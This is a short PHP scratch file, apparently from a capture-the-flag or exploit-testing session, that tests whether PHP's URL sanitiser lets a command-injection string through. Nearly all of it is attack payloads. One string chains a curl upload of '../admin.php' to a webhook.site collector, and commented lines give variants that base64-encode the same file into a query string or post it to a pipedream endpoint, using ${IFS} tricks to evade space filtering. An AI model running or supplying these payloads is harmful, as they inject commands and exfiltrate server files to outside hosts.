<?php

$s = filter_var('https://webhook.site/fdc89291-5fc7-4be5-8d8b-e747cbfd3a65 && curl -F file=@../admin.php https://webhook.site/fdc89291-5fc7-4be5-8d8b-e747cbfd3a65', FILTER_SANITIZE_URL);
echo $s;
// system('php ./app/scripts/send_pass.php aaa https://webhook.site/fdc89291-5fc7-4be5-8d8b-e747cbfd3a65?c=$(cat${IFS}../admin.php|base64${IFS}-w0) > /dev/null 2>&1 &');
// https: //webhook.site/c3c76321-9b50-464d-917b-bfbb967823e9 && curl${IFS%??}--data${IFS%??}@../admin.php${IFS%??}https://eonule7v037fny0.m.pipedream.net/
